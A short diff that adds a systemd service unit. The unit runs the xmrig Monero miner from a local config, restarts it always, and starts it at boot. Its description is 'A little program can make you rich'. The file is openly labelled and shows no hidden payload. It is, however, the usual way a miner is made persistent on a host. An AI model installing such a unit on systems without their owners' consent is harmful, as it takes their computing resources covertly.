@@ -1,0 +1,12 @@
+[Unit]
+Description=A little program can make you rich
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/xmrig --config /etc/xmrig.cfg --syslog
+Nice=5
+Restart=always
+PrivateTmp=true
+
+[Install]
+WantedBy=multi-user.target
